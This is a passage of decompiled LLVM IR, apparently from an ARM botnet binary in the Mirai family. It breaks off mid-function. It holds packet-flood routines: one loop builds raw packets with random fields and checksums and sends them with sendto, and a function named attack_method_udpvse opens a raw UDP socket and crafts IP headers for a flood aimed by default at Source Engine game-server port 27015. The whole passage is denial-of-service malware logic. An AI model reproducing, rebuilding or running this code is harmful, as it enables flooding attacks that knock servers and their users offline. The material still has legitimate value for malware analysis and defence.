  store i16 %v3_9ec8, i16* %v5_9ed0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9ed8 = trunc i32 %v0_9ed8 to i16
  %v2_9ed8 = load i32, i32* @r6, align 4
  %v3_9ed8 = add i32 %v2_9ed8, 10
  %v4_9ed8 = inttoptr i32 %v3_9ed8 to i16*
  store i16 %v1_9ed8, i16* %v4_9ed8, align 2
  %v0_9edc = load i32, i32* @r6, align 4
  store i32 %v0_9edc, i32* @r0, align 4
  %v2_9ee0 = call i32 @checksum_generic(i32 %v0_9edc, i32 20)
  %v3_9ee0 = trunc i32 %v2_9ee0 to i16
  %v3_9ee4 = load i32, i32* @r6, align 4
  %v4_9ee4 = add i32 %v3_9ee4, 10
  %v5_9ee4 = inttoptr i32 %v4_9ee4 to i16*
  store i16 %v3_9ee0, i16* %v5_9ee4, align 2
  store i32 0, i32* @r4, align 4
  %v0_9eec = load i32, i32* @r7, align 4
  store i32 %v0_9eec, i32* @r1, align 4
  %v1_9ef0 = add i32 %v0_9eec, 4
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i16*
  %v3_9ef0 = load i16, i16* %v2_9ef0, align 2
  %v4_9ef0 = zext i16 %v3_9ef0 to i32
  store i32 %v4_9ef0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_9ef8 = add i32 %v0_9eec, 6
  %v4_9ef8 = inttoptr i32 %v3_9ef8 to i16*
  store i16 0, i16* %v4_9ef8, align 2
  %v0_9efc = load i32, i32* @r6, align 4
  %v4_9f00 = call i32 @checksum_tcpudp(i32 %v0_9efc, i32 %v0_9eec, i32 %v4_9ef0, i32 %stack_var_-124.0.ph)
  %v5_9f00 = trunc i32 %v4_9f00 to i16
  %v3_9f04 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f04, i32* %r2.global-to-local, align 4
  %v3_9f08 = mul i32 %v3_9f04, 32
  store i32 %v3_9f08, i32* %r3.global-to-local, align 4
  %v0_9f0c = load i32, i32* @r5, align 4
  %v1_9f0c = add i32 %v0_9f0c, 16
  %v2_9f0c = inttoptr i32 %v1_9f0c to i32*
  %v3_9f0c = load i32, i32* %v2_9f0c, align 4
  %v5_9f10 = mul i32 %v3_9f04, 24
  store i32 %v5_9f10, i32* %r3.global-to-local, align 4
  %v1_9f14 = load i32, i32* @sb, align 4
  %v2_9f14 = add i32 %v1_9f14, %v5_9f10
  store i32 %v2_9f14, i32* @lr, align 4
  %v2_9f18 = add i32 %v2_9f14, 4
  %v3_9f18 = inttoptr i32 %v2_9f18 to i32*
  store i32 %v3_9f0c, i32* %v3_9f18, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9f20 = load i32, i32* @r7, align 4
  %v4_9f20 = add i32 %v3_9f20, 6
  %v5_9f20 = inttoptr i32 %v4_9f20 to i16*
  store i16 %v5_9f00, i16* %v5_9f20, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9f28 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f28 = trunc i32 %v0_9f28 to i16
  %v2_9f28 = load i32, i32* %r3.global-to-local, align 4
  %v3_9f28 = load i32, i32* @sb, align 4
  %v4_9f28 = add i32 %v3_9f28, %v2_9f28
  %v5_9f28 = inttoptr i32 %v4_9f28 to i16*
  store i16 %v1_9f28, i16* %v5_9f28, align 2
  %v0_9f2c = load i32, i32* @r4, align 4
  %v1_9f2c = trunc i32 %v0_9f2c to i16
  %v2_9f2c = load i32, i32* @lr, align 4
  %v3_9f2c = add i32 %v2_9f2c, 2
  %v4_9f2c = inttoptr i32 %v3_9f2c to i16*
  store i16 %v1_9f2c, i16* %v4_9f2c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9f34 = load i32, i32* @r5, align 4
  store i32 %v0_9f34, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r8, align 4
  store i32 %v0_9f3c, i32* %r2.global-to-local, align 4
  %v0_9f40 = load i32, i32* @lr, align 4
  %v0_9f44 = load i32, i32* %ip.global-to-local, align 4
  %v6_9f48 = call i32 @__libc_sendto(i32 %v3_9bbc, i32 %v0_9f34, i32 %v0_9f3c, i32 16384, i32 %v0_9f40, i32 %v0_9f44)
  %v3_9f4c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f4c, i32* %r3.global-to-local, align 4
  %v1_9f50 = add i32 %v3_9f4c, 1
  %v1_9f54 = load i32, i32* @sl, align 4
  %v9_9f54 = icmp eq i32 %v1_9f50, %v1_9f54
  store i1 %v9_9f54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9f50, i32* %stack_var_-44, align 4
  %v6_9f5c = icmp slt i32 %v1_9f50, %v1_9f54
  br i1 %v6_9f5c, label %dec_label_pc_9e3c, label %dec_label_pc_9e28

dec_label_pc_9f64:                                ; preds = %dec_label_pc_9e3c
  %v1_9f64 = add i32 %v2_9e44, 16
  %v2_9f64 = inttoptr i32 %v1_9f64 to i32*
  %v3_9f64 = load i32, i32* %v2_9f64, align 4
  store i32 %v3_9f64, i32* %r4.global-to-local, align 4
  %v0_9f68 = call i32 @rand_next()
  %v3_9f6c = load i32, i32* %stack_var_-44, align 4
  %v5_9f74 = mul i32 %v3_9f6c, 24
  %v0_9f78 = load i32, i32* %r4.global-to-local, align 4
  %v1_9f78 = and i32 %v0_9f78, 16711680
  store i32 %v1_9f78, i32* %ip.global-to-local, align 4
  %v3_9f7c = udiv i32 %v0_9f78, 16777216
  %v4_9f80 = udiv i32 %v1_9f78, 256
  %v5_9f80 = or i32 %v4_9f80, %v3_9f7c
  store i32 %v5_9f80, i32* %r2.global-to-local, align 4
  %v1_9f84 = load i32, i32* @sb, align 4
  %v2_9f84 = add i32 %v1_9f84, %v5_9f74
  store i32 %v2_9f84, i32* %r1.global-to-local, align 4
  %v1_9f88 = and i32 %v0_9f78, 65280
  store i32 %v1_9f88, i32* %r3.global-to-local, align 4
  %v1_9f8c = add i32 %v2_9f84, 20
  %v2_9f8c = inttoptr i32 %v1_9f8c to i8*
  %v3_9f8c = load i8, i8* %v2_9f8c, align 1
  %v4_9f8c = zext i8 %v3_9f8c to i32
  store i32 %v4_9f8c, i32* %ip.global-to-local, align 4
  %v5_9f94 = call i32 @llvm.bswap.i32(i32 %v0_9f78)
  %v7_9f98 = lshr i32 %v0_9f68, %v4_9f8c
  %v8_9f98 = add i32 %v7_9f98, %v5_9f94
  store i32 %v8_9f98, i32* %r2.global-to-local, align 4
  store i32 %v5_9ba8, i32* %r1.global-to-local, align 4
  %v5_9fb4 = call i32 @llvm.bswap.i32(i32 %v8_9f98)
  store i32 %v5_9fb4, i32* %r3.global-to-local, align 4
  store i1 %v7_9e68, i1* %cpsr_z.global-to-local, align 1
  %v1_9fbc = load i32, i32* @r5, align 4
  %v2_9fbc = add i32 %v1_9fbc, 16
  %v3_9fbc = inttoptr i32 %v2_9fbc to i32*
  store i32 %v5_9fb4, i32* %v3_9fbc, align 4
  br i1 %v2_9e68, label %dec_label_pc_9fc4, label %dec_label_pc_9e70

dec_label_pc_9fc4:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9e64
  %v0_9fc4 = call i32 @rand_next()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9fd0 = load i32, i32* @fp, align 4
  %v9_9fd0 = icmp eq i32 %v0_9fd0, 65535
  store i1 %v9_9fd0, i1* %cpsr_z.global-to-local, align 1
  %v1_9fd4 = load i32, i32* @r5, align 4
  %v2_9fd4 = add i32 %v1_9fd4, 12
  %v3_9fd4 = inttoptr i32 %v2_9fd4 to i32*
  store i32 %v0_9fc4, i32* %v3_9fd4, align 4
  br i1 %v9_9fd0, label %dec_label_pc_9fdc, label %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge

dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge:    ; preds = %dec_label_pc_9fc4
  %v1_9e84.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9e70
  %v0_9fdc = call i32 @rand_next()
  %v3_9fe4 = urem i32 %v0_9fdc, 65536
  store i32 %v3_9c08, i32* %r2.global-to-local, align 4
  %v1_9ff0 = sub nsw i32 999, %v3_9fe4
  store i32 %v1_9ff0, i32* %r3.global-to-local, align 4
  %v1_9ff4 = load i32, i32* %r4.global-to-local, align 4
  %v9_9ff4 = icmp eq i32 %v3_9c08, %v1_9ff4
  store i1 %v9_9ff4, i1* %cpsr_z.global-to-local, align 1
  %v1_9ff8 = trunc i32 %v0_9fdc to i16
  %v2_9ff8 = load i32, i32* @r5, align 4
  %v3_9ff8 = add i32 %v2_9ff8, 4
  %v4_9ff8 = inttoptr i32 %v3_9ff8 to i16*
  store i16 %v1_9ff8, i16* %v4_9ff8, align 2
  %v0_9ffc = load i32, i32* %r3.global-to-local, align 4
  %v1_9ffc = trunc i32 %v0_9ffc to i16
  %v2_9ffc = load i32, i32* @r6, align 4
  %v3_9ffc = add i32 %v2_9ffc, 4
  %v4_9ffc = inttoptr i32 %v3_9ffc to i16*
  store i16 %v1_9ffc, i16* %v4_9ffc, align 2
  br i1 %v9_9ff4, label %dec_label_pc_a004, label %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge

dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge:    ; preds = %dec_label_pc_9fdc
  %v1_9e90.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e8c

dec_label_pc_a004:                                ; preds = %dec_label_pc_9fdc, %dec_label_pc_9e80
  %v0_a004 = call i32 @rand_next()
  %v1_a004 = trunc i32 %v0_a004 to i16
  store i32 %v3_9c0c, i32* %r3.global-to-local, align 4
  %v1_a00c = load i32, i32* %r4.global-to-local, align 4
  %v9_a00c = icmp eq i32 %v3_9c0c, %v1_a00c
  store i1 %v9_a00c, i1* %cpsr_z.global-to-local, align 1
  %v3_a010 = load i32, i32* @r5, align 4
  %v4_a010 = add i32 %v3_a010, 44
  %v5_a010 = inttoptr i32 %v4_a010 to i16*
  store i16 %v1_a004, i16* %v5_a010, align 2
  br i1 %v9_a00c, label %dec_label_pc_a018, label %dec_label_pc_9e98

dec_label_pc_a018:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9e8c
  %v0_a018 = call i32 @rand_next()
  %v1_a018 = trunc i32 %v0_a018 to i16
  store i32 %v1_9c00, i32* @r4, align 4
  store i1 %v2_a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a020, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_a018
  %v3_a02831 = load i32, i32* @r7, align 4
  %v4_a02832 = add i32 %v3_a02831, 2
  %v5_a02833 = inttoptr i32 %v4_a02832 to i16*
  store i16 %v1_a018, i16* %v5_a02833, align 2
  br label %dec_label_pc_a034

bb85:                                             ; preds = %dec_label_pc_a018
  %v1_a024 = load i32, i32* @r5, align 4
  %v2_a024 = add i32 %v1_a024, 16
  %v3_a024 = inttoptr i32 %v2_a024 to i32*
  %v4_a024 = load i32, i32* %v3_a024, align 4
  store i32 %v4_a024, i32* %r3.global-to-local, align 4
  %v3_a028 = load i32, i32* @r7, align 4
  %v4_a028 = add i32 %v3_a028, 2
  %v5_a028 = inttoptr i32 %v4_a028 to i16*
  store i16 %v1_a018, i16* %v5_a028, align 2
  %v1_a02c = load i32, i32* %r3.global-to-local, align 4
  %v2_a02c = load i32, i32* @r6, align 4
  %v3_a02c = add i32 %v2_a02c, 16
  %v4_a02c = inttoptr i32 %v3_a02c to i32*
  store i32 %v1_a02c, i32* %v4_a02c, align 4
  br label %dec_label_pc_9eac

dec_label_pc_a034:                                ; preds = %.thread30, %dec_label_pc_9e98
  %v0_a034 = call i32 @rand_next()
  store i32 %v1_9b74, i32* %r1.global-to-local, align 4
  store i1 %v2_a03c, i1* %cpsr_z.global-to-local, align 1
  %v1_a040 = load i32, i32* @r6, align 4
  %v2_a040 = add i32 %v1_a040, 16
  %v3_a040 = inttoptr i32 %v2_a040 to i32*
  store i32 %v0_a034, i32* %v3_a040, align 4
  br i1 %v2_a03c, label %dec_label_pc_9eb8, label %dec_label_pc_a048

dec_label_pc_a048:                                ; preds = %dec_label_pc_9eac, %dec_label_pc_a034
  %v0_a048 = load i32, i32* @r7, align 4
  %v1_a048 = add i32 %v0_a048, 8
  store i32 %v5_9b54, i32* %r1.global-to-local, align 4
  %v2_a050 = inttoptr i32 %v1_a048 to i16*
  %v3_a050 = call i32 @rand_str(i16* %v2_a050, i32 %v5_9b54)
  br label %dec_label_pc_9eb8

dec_label_pc_a058:                                ; preds = %dec_label_pc_9bcc
  %v1_a05c = call i32 @__GI___libc_close(i32 %v3_9bbc)
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %entry, %dec_label_pc_a058
  %v1_a068 = phi i32 [ %v3_9bbc, %entry ], [ %v1_a05c, %dec_label_pc_a058 ]
  store i32 %v3_9a6c, i32* %r4.global-to-local, align 4
  store i32 %v6_9a6c, i32* %r5.global-to-local, align 4
  store i32 %v24_9a6c, i32* %fp.global-to-local, align 4
  ret i32 %v1_a068

dec_label_pc_a06c:                                ; preds = %dec_label_pc_9bf4
  store i32 %v5_9b54, i32* %r2.global-to-local, align 4
  %v1_a074 = add i32 %v5_9b54, 8
  store i32 %v1_a074, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9e28.preheader

; uselistorder directives
  uselistorder i32 %v1_a074, { 1, 0 }
  uselistorder i16 %v1_a018, { 1, 0 }
  uselistorder i32 %v0_9fdc, { 1, 0 }
  uselistorder i32 %v5_9fb4, { 1, 0 }
  uselistorder i32 %v0_9f78, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9f54, { 1, 2, 0 }
  uselistorder i32 %v1_9f50, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9f04, { 1, 0, 2 }
  uselistorder i32 %v0_9eec, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9e50, { 1, 0, 2 }
  uselistorder i1 %v7_9e68, { 2, 1, 0 }
  uselistorder i1 %v2_a03c, { 2, 3, 1, 0 }
  uselistorder i1 %v2_a020, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9dc4, { 1, 0 }
  uselistorder i32 %v4_9d3813, { 1, 0 }
  uselistorder i32 %v3_9c5c, { 1, 0 }
  uselistorder i32 %v3_9c40, { 1, 2, 0 }
  uselistorder i32 %v1_9c3c, { 1, 0 }
  uselistorder i32 %v1_9c00, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9bfc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9bf8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9bf4, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9bec, { 1, 0 }
  uselistorder i1 %v7_9bc0, { 1, 0 }
  uselistorder i32 %v3_9bbc, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v5_9ba8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9b74, { 2, 1, 3, 0 }
  uselistorder i32 %v5_9b54, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_9b08, { 1, 0 }
  uselistorder i32 %v1_9ae4, { 2, 1, 0 }
  uselistorder i32 %v5_9adc, { 1, 0 }
  uselistorder i8 %v5_9ac0, { 0, 2, 1 }
  uselistorder i32 %v6_9aa0, { 1, 0 }
  uselistorder i32 %v2_9a88, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_a048, { 1, 0 }
  uselistorder label %dec_label_pc_9eb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9e28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9e28.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_method_udpvse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_a088 = load i32, i32* @r4, align 4
  %v27_a088 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a0a4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a0a8 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0a4, i32* @fp, align 4
  %v0_a0b8 = load i32, i32* @r4, align 4
  %v4_a0bc = inttoptr i32 %v0_a0a8 to i32*
  %v5_a0bc = call i32 @attack_get_opt_int(i32 %v0_a0b8, i32* %v4_a0bc, i32 2, i32 0)
  %v1_a0c8 = urem i32 %v5_a0bc, 256
  store i32 %v1_a0c8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a0d4 = load i32, i32* @r4, align 4
  %v0_a0d8 = load i32, i32* @r5, align 4
  %v5_a0dc = trunc i32 %v5_a0bc to i8
  %v6_a0e0 = inttoptr i32 %v0_a0d8 to i32*
  %v7_a0e0 = call i32 @attack_get_opt_int(i32 %v0_a0d4, i32* %v6_a0e0, i32 3, i32 65535)
  %v0_a0e4 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a0e0, i32* @r7, align 4
  %v0_a0f4 = load i32, i32* @r4, align 4
  %v4_a0f8 = inttoptr i32 %v0_a0e4 to i32*
  %v5_a0f8 = call i32 @attack_get_opt_int(i32 %v0_a0f4, i32* %v4_a0f8, i32 4, i32 64)
  %v1_a100 = urem i32 %v5_a0f8, 256
  store i32 %v1_a100, i32* %ip.global-to-local, align 4
  %v0_a104 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a110 = load i32, i32* @r4, align 4
  %v6_a118 = inttoptr i32 %v0_a104 to i32*
  %v7_a118 = call i32 @attack_get_opt_int(i32 %v0_a110, i32* %v6_a118, i32 5, i32 0)
  %v1_a124 = urem i32 %v7_a118, 256
  store i32 %v1_a124, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a130 = load i32, i32* @r4, align 4
  %v0_a134 = load i32, i32* @r5, align 4
  %v5_a13c = inttoptr i32 %v0_a134 to i32*
  %v6_a13c = call i32 @attack_get_opt_int(i32 %v0_a130, i32* %v5_a13c, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a14c = load i32, i32* @r5, align 4
  store i32 %v6_a13c, i32* @r6, align 4
  %v0_a154 = load i32, i32* @r4, align 4
  %v4_a158 = inttoptr i32 %v0_a14c to i32*
  %v5_a158 = call i32 @attack_get_opt_int(i32 %v0_a154, i32* %v4_a158, i32 7, i32 27015)
  store i32 %v5_a158, i32* @r4, align 4
  %v1_a164 = call i32 @table_unlock_val(i32 20)
  %v3_a170 = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_a184 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_a188 = icmp eq i32 %v3_a184, -1
  store i1 %v7_a188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a184, i32* @sb, align 4
  br i1 %v7_a188, label %dec_label_pc_a4b0, label %dec_label_pc_a194

dec_label_pc_a194:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a19c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a19c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a1b0 = call i32 @__GI_setsockopt(i32 %v3_a184, i32 0, i32 3, i32 %v6_a19c, i32 ptrtoint (i32* @0 to i32))
  %v7_a1b4 = icmp eq i32 %v5_a1b0, -1
  store i1 %v7_a1b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1b4, label %dec_label_pc_a4a8, label %dec_label_pc_a1bc

dec_label_pc_a1bc:                                ; preds = %dec_label_pc_a194
  %v0_a1bc = load i32, i32* @r4, align 4
  %v3_a1bc = mul i32 %v0_a1bc, 65536
  store i32 %v3_a1bc, i32* @lr, align 4
  %v0_a1c0 = load i32, i32* @r7, align 4
  %v0_a1c4 = load i32, i32* @r6, align 4
  %v3_a1c4 = mul i32 %v0_a1c4, 65536
  store i32 %v3_a1c4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_a1cc = urem i32 %v0_a1c0, 65536
  %v3_a1d0 = urem i32 %v0_a1c4, 65536
  store i32 %v3_a1d0, i32* %r2.global-to-local, align 4
  %v3_a1d4 = urem i32 %v0_a1bc, 65536
  store i32 %v3_a1d4, i32* %r3.global-to-local, align 4
  %v0_a1d8 = load i32, i32* @r8, align 4
  %v2_a1d8 = icmp eq i32 %v0_a1d8, 0
  store i1 %v2_a1d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a1d8, label %dec_label_pc_a314.preheader, label %dec_label_pc_a1f0

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a1bc
  %tmp34 = mul i32 %v0_a1c0, 256
  %v3_a200 = and i32 %tmp34, 65280
  store i32 %v3_a200, i32* %r3.global-to-local, align 4
  %tmp35 = mul i32 %v0_a1c4, 256
  %v3_a204 = and i32 %tmp35, 65280
  store i32 %v3_a204, i32* %r2.global-to-local, align 4
  %tmp36 = mul i32 %v0_a1bc, 256
  %v3_a208 = and i32 %tmp36, 65280
  %tmp37 = udiv i32 %v0_a1c0, 256
  %v4_a20c = urem i32 %tmp37, 256
  %v5_a20c = or i32 %v4_a20c, %v3_a200
  store i32 %v5_a20c, i32* @r5, align 4
  %tmp38 = udiv i32 %v0_a1c4, 256
  %v4_a210 = urem i32 %tmp38, 256
  %v5_a210 = or i32 %v4_a210, %v3_a204
  store i32 %v5_a210, i32* @r6, align 4
  %tmp39 = udiv i32 %v0_a1bc, 256
  %v4_a214 = urem i32 %tmp39, 256
  %v5_a214 = or i32 %v4_a214, %v3_a208
  store i32 %v5_a214, i32* @r7, align 4
  %v1_a29c = trunc i32 %v5_a0f8 to i8
  br label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %.thread, %dec_label_pc_a1f0
  %v2_a220 = call i32 @calloc(i32 128, i32 1)
  %v3_a224 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a224, i32* %r2.global-to-local, align 4
  %v5_a22c = mul i32 %v3_a224, 24
  store i32 %v5_a22c, i32* %r3.global-to-local, align 4
  %v1_a230 = load i32, i32* @fp, align 4
  %v2_a230 = load i32, i32* @r4, align 4
  %v5_a230 = mul i32 %v2_a230, 4
  %v6_a230 = add i32 %v5_a230, %v1_a230
  %v7_a230 = inttoptr i32 %v6_a230 to i32*
  store i32 %v2_a220, i32* %v7_a230, align 4
  %v0_a234 = load i32, i32* %r3.global-to-local, align 4
  %v1_a234 = load i32, i32* @sl, align 4
  %v2_a234 = add i32 %v1_a234, %v0_a234
  store i32 %v2_a234, i32* %r3.global-to-local, align 4
  %v0_a238 = load i32, i32* @fp, align 4
  %v1_a238 = load i32, i32* %r2.global-to-local, align 4
  %v4_a238 = mul i32 %v1_a238, 4
  %v5_a238 = add i32 %v4_a238, %v0_a238
  %v6_a238 = inttoptr i32 %v5_a238 to i32*
  %v7_a238 = load i32, i32* %v6_a238, align 4
  store i32 %v7_a238, i32* @lr, align 4
  %v1_a240 = inttoptr i32 %v7_a238 to i8*
  %v2_a240 = load i8, i8* %v1_a240, align 1
  %tmp = urem i8 %v2_a240, 16
  %v1_a244 = zext i8 %tmp to i32
  %v1_a248 = or i32 %v1_a244, 64
  store i32 %v1_a248, i32* %r3.global-to-local, align 4
  %v1_a250 = trunc i32 %v1_a248 to i8
  store i8 %v1_a250, i8* %v1_a240, align 1
  %v0_a254 = load i32, i32* @lr, align 4
  %v1_a254 = inttoptr i32 %v0_a254 to i8*
  %v2_a254 = load i8, i8* %v1_a254, align 1
  %v1_a258 = and i8 %v2_a254, -16
  %v1_a25c = or i8 %v1_a258, 5
  store i8 %v1_a25c, i8* %v1_a254, align 1
  %v2_a268 = load i32, i32* @lr, align 4
  %v3_a268 = add i32 %v2_a268, 1
  %v4_a268 = inttoptr i32 %v3_a268 to i8*
  store i8 %v5_a0dc, i8* %v4_a268, align 1
  %v3_a26c = load i32, i32* %stack_var_-48, align 4
  %v3_a270 = mul i32 %v3_a26c, 65536
  %v1_a274 = add i32 %v3_a270, 2097152
  %v3_a278 = udiv i32 %v1_a274, 256
  %v4_a280 = udiv i32 %v1_a274, 16777216
  %v5_a280 = or i32 %v3_a278, %v4_a280
  %v3_a284 = urem i32 %v3_a26c, 65536
  store i32 %v3_a284, i32* %r2.global-to-local, align 4
  %v1_a288 = trunc i32 %v5_a280 to i16
  %v2_a288 = load i32, i32* @lr, align 4
  %v3_a288 = add i32 %v2_a288, 2
  %v4_a288 = inttoptr i32 %v3_a288 to i16*
  store i16 %v1_a288, i16* %v4_a288, align 2
  %v0_a28c = load i32, i32* %r2.global-to-local, align 4
  %v1_a28c = mul i32 %v0_a28c, 65536
  %v3_a294 = add i32 %v1_a28c, 786432
  store i32 %v3_a294, i32* %r2.global-to-local, align 4
  store i32 %v1_a124, i32* %ip.global-to-local, align 4
  %v2_a29c = load i32, i32* @lr, align 4
  %v3_a29c = add i32 %v2_a29c, 8
  %v4_a29c = inttoptr i32 %v3_a29c to i8*
  store i8 %v1_a29c, i8* %v4_a29c, align 1
  %v0_a2a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_a2a0 = udiv i32 %v0_a2a0, 256
  %v1_a2a4 = and i32 %v3_a2a0, 65280
  %v0_a2a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_a2a8 = icmp eq i32 %v0_a2a8, 0
  store i1 %v2_a2a8, i1* %cpsr_z.global-to-local, align 1
  %v4_a2ac = udiv i32 %v0_a2a0, 16777216
  %v5_a2ac = or i32 %v1_a2a4, %v4_a2ac
  store i32 %v5_a2ac, i32* %ip.global-to-local, align 4
  %v2_a2b4 = load i32, i32* @lr, align 4
  %v3_a2b4 = add i32 %v2_a2b4, 9
  %v4_a2b4 = inttoptr i32 %v3_a2b4 to i8*
  store i8 17, i8* %v4_a2b4, align 1
  store i32 ptrtoint (i32* @global_var_243d0.55 to i32), i32* %r3.global-to-local, align 4
  %v0_a2bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a2bc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a218
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a2c0 = load i32, i32* @lr, align 4
  %v4_a2c0 = add i32 %v3_a2c0, 6
  %v5_a2c0 = inttoptr i32 %v4_a2c0 to i16*
  store i16 64, i16* %v5_a2c0, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a218, %bb
  %v2_a2c4 = load i32, i32* @global_var_243d0.55, align 4
  %v1_a2c8 = load i32, i32* @lr, align 4
  %v2_a2c8 = add i32 %v1_a2c8, 12
  %v3_a2c8 = inttoptr i32 %v2_a2c8 to i32*
  store i32 %v2_a2c4, i32* %v3_a2c8, align 4
  store i32 %v2_a234, i32* %r2.global-to-local, align 4
  %v1_a2d0 = add i32 %v2_a234, 16
  %v2_a2d0 = inttoptr i32 %v1_a2d0 to i32*
  %v3_a2d0 = load i32, i32* %v2_a2d0, align 4
